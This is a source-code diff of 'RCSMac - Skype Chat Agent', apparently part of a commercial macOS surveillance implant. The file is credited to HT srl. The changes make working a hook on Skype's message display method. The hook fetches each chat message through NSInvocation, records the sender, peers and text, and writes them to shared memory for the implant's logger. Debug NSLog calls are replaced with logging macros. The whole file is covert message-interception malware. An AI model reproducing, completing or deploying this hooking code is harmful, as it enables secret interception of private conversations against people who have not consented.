@@ -1,8 +1,6 @@
 /*
- * RCSMac - Skype Agent
+ * RCSMac - Skype Chat Agent
  * 
- * [QUICK TODO]
- * - Voice
  *
  * Created by Alfredo 'revenge' Pesoli on 11/05/2009
  * Copyright (C) HT srl 2009. All rights reserved
@@ -11,57 +9,56 @@
 
 #import "RCSMAgentIMSkype.h"
 
-//#define DEBUG
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
+
 
 @implementation mySkypeChat
 
 - (BOOL)isMessageRecentlyDisplayedHook: (uint)arg1
 {
   BOOL success  = [self isMessageRecentlyDisplayedHook: arg1];
-  id message    = [self getChatMessageWithObjectID: arg1];
-  /*
-  NSMethodSignature *methodSignature = [[self class] instanceMethodSignatureForSelector: @selector(getChatMessageWithObjectID:)];
-  NSInvocation *invocation           = [NSInvocation invocationWithMethodSignature: methodSignature];
-  
-  [invocation setTarget: self];
-  [invocation setSelector: @selector(getChatMessageWithObjectID:)];
-  [invocation setArgument: &arg1 atIndex: 2];
-  
-  [invocation invoke];
-  [invocation getReturnValue: message];
-  
+  id message    = nil;
   
   if ([self respondsToSelector: @selector(getChatMessageWithObjectID:)])
     {
-#ifdef DEBUG
-      NSLog(@"Method found so what?");
-#endif
+      SEL sel = @selector(getChatMessageWithObjectID:);
       
+      NSMethodSignature *signature = [self methodSignatureForSelector: sel];
+      NSInvocation *invocation     = [NSInvocation invocationWithMethodSignature: signature];
+      
+      [invocation setTarget: self];
+      [invocation setSelector: sel];
+      [invocation setArgument: &arg1 atIndex: 2];
+      
+      [invocation invoke];
+      [invocation getReturnValue: &message];
     }
-  */
+  else
+    {
+#ifdef DEBUG_IM_SKYPE
+      errorLog(@"Skype does not responds to getChatMessageWithObjectID");
+#endif
+      return NO;
+    }
+  
   if (message == nil)
     {
-#ifdef DEBUG
-      NSLog(@"[ERR] Failed to obtain message");
+#ifdef DEBUG_IM_SKYPE
+      errorLog(@"[ERR] Failed to obtain message");
 #endif
       
-      return success;
+      return NO;
     }
-  //id message    = [self performSelector: @selector(getChatMessageWithObjectID)
-  //                           withObject: arg1];
   
   NSArray *_activeMembers;
   NSMutableString *activeMembers  = [[NSMutableString alloc] init];
   NSMutableString *loggedText     = [[NSMutableString alloc] init];
-
-#ifdef DEBUG
-  NSLog(@"message: %@", message);
-#endif
   
   if (message != nil)
     {
-#ifdef DEBUG
-      NSLog(@"posterHandles: %@", [self performSelector: @selector(posterHandles)]);
+#ifdef DEBUG_IM_SKYPE
+      infoLog(@"posterHandles: %@", [self performSelector: @selector(posterHandles)]);
 #endif
       
       if ([self respondsToSelector: @selector(activeMemberHandles)]) // Skype < 2.8.0.722
@@ -97,11 +94,11 @@
           // Appending the message body
           [loggedText appendString: [message body]];
           
-#ifdef DEBUG
-          NSLog(@"fromUser: %@", [message fromUser]);
-          NSLog(@"dialogContact: %@", [self performSelector: @selector(dialogContact)]);
-          NSLog(@"peers: %@", activeMembers);
-          NSLog(@"message: %@", loggedText);
+#ifdef DEBUG_IM_SKYPE
+          infoLog(@"fromUser: %@", [message fromUser]);
+          infoLog(@"dialogContact: %@", [self performSelector: @selector(dialogContact)]);
+          infoLog(@"peers: %@", activeMembers);
+          infoLog(@"message: %@", loggedText);
 #endif
         }
     }
@@ -171,8 +168,8 @@
   [entryData appendBytes: &del
                   length: sizeof(del)];
   
-#ifdef DEBUG
-  NSLog(@"entryData: %@", entryData);
+#ifdef DEBUG_IM_SKYPE
+  verboseLog(@"entryData: %@", entryData);
 #endif
   
   // Log buffer
@@ -187,22 +184,22 @@
          [entryData bytes],
          [entryData length]);
   
-#ifdef DEBUG
-  NSLog(@"logData: %@", logData);
+#ifdef DEBUG_IM_SKYPE
+  verboseLog(@"logData: %@", logData);
 #endif
   
   if ([mSharedMemoryLogging writeMemory: logData 
                                  offset: 0
                           fromComponent: COMP_AGENT] == TRUE)
     {
-#ifdef DEBUG
-      NSLog(@"message: %@", loggedText);
+#ifdef DEBUG_IM_SKYPE
+      verboseLog(@"message: %@", loggedText);
 #endif
     }
   else
     {
-#ifdef DEBUG
-      NSLog(@"Error while logging skype message to shared memory");
+#ifdef DEBUG_IM_SKYPE
+      errorLog(@"Error while logging skype message to shared memory");
 #endif
     }
   
